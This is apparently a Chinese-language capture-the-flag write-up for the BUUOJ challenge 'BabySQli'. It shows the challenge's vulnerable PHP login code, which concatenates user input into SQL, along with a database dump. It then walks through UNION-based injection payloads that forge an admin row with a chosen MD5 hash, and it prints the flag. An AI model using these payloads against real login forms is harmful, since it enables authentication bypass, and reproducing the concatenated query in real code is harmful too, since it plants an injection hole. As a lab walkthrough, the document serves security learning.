# BabySQli

[题目地址](https://buuoj.cn/challenges#[GXYCTF2019]BabySQli)

10道题里有8个baby。

给了源代码地址，不看简直浪费。index.php没啥东西，重点在search.php。

```php
<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
<title>Do you know who am I?</title>
<?php
require "config.php";
require "flag.php";

// 去除转义
if (get_magic_quotes_gpc()) {
	function stripslashes_deep($value)
	{
		$value = is_array($value) ?
		array_map('stripslashes_deep', $value) :
		stripslashes($value);
		return $value;
	}

	$_POST = array_map('stripslashes_deep', $_POST);
	$_GET = array_map('stripslashes_deep', $_GET);
	$_COOKIE = array_map('stripslashes_deep', $_COOKIE);
	$_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}

mysqli_query($con,'SET NAMES UTF8');
$name = $_POST['name'];
$password = $_POST['pw'];
$t_pw = md5($password);
$sql = "select * from user where username = '".$name."'";
// echo $sql;
$result = mysqli_query($con, $sql);


if(preg_match("/\(|\)|\=|or/", $name)){
	die("do not hack me!");
}
else{
	if (!$result) {
		printf("Error: %s\n", mysqli_error($con));
		exit();
	}
	else{
		// echo '<pre>';
		$arr = mysqli_fetch_row($result);
		// print_r($arr);
		if($arr[1] == "admin"){
			if(md5($password) == $arr[2]){
				echo $flag;
			}
			else{
				die("wrong pass!");
			}
		}
		else{
			die("wrong user!");
		}
	}
}

?>
```

最上面的编码一看就是base家族,先base32然后base64得到查询语句：select * from user where username = '$name'。然而过滤黑名单就很难受，括号，=和or，or可以用Or绕过，但是括号和=太伤了，函数不能用，判断不能用，从数据库里搞数据是不可能了。发动找[wp](https://blog.csdn.net/SopRomeo/article/details/104682814)技能。

联合查询竟然有这种骚操作？在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。想让这个构造出的虚拟数据能用需要将字段放对位置。什么是放对位置？就是要构造数据的原表的name字段不能放password，必须是name。这是废话，但是说明了在执行union select x，y，z时，需要猜测原表内x，y，z对应的字段。源码中有写。

```sql
-- phpMyAdmin SQL Dump
-- version 4.6.4
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: 2019-12-03 11:43:42
-- 服务器版本： 5.7.14
-- PHP Version: 5.6.25
CREATE DATABASE web_sqli;
use web_sqli;
SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `web_sqli`
--

-- --------------------------------------------------------

--
-- 表的结构 `user`
--

CREATE TABLE `user` (
  `id` int(11) NOT NULL,
  `username` varchar(20) CHARACTER SET gbk NOT NULL,
  `passwd` varchar(32) CHARACTER SET gbk NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- 转存表中的数据 `user`
--

INSERT INTO `user` (`id`, `username`, `passwd`) VALUES
(1, 'admin', 'cdc9c819c7f8be2628d4180669009d28');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`id`);

--
-- 在导出的表使用AUTO_INCREMENT
--

--
-- 使用表AUTO_INCREMENT `user`
--
ALTER TABLE `user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
```

是id，username，passwd。其实也能不看代码猜出来，毕竟大部分都是这个结构。或者在登录框试这个payload:

- ' union select 0,1,2#
> wrong user!

如果把1改成admin这个常见账号名，回显会不一样。

- ' union select 0,'admin',2#
> wrong pass!

说明1所在的位置是username。那第一个是id，第三个就是password了。直接自己编个密码，求出md5值后构造payload放入登录框。

- ' union select 0,'admin','81dc9bdb52d04dc20036dbd8313ed055'#

## Flag
> flag{cbacdf39-5d07-4eae-b4c0-1d973263fc6c}